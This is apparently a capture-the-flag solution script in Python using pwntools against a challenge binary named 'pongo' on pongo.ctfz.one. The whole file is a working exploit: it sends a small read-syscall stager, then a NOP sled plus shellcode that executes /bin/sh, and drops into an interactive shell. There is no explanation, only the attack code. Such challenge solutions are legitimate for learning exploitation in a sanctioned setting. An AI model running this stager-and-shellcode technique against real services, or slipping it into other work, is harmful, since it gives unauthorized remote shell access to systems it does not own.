#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import time

from pwn import *

elf = context.binary = ELF("./pongo")


def start(argv=[], *a, **kw):
    host = args.HOST or 'pongo.ctfz.one'
    port = int(args.PORT or 3337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

stager = asm("""
xor rdi, rdi
xor eax, eax
syscall
nop
""")

io.sendlineafter(b">>> ", b"2")
io.send(stager)

sc = shellcraft.amd64
payload = asm(sc.nop() * 8 + sc.linux.execve("/bin/sh"))

io.sendlineafter(b">>> ", b"3")
time.sleep(0.5)
io.send(payload)

io.interactive()
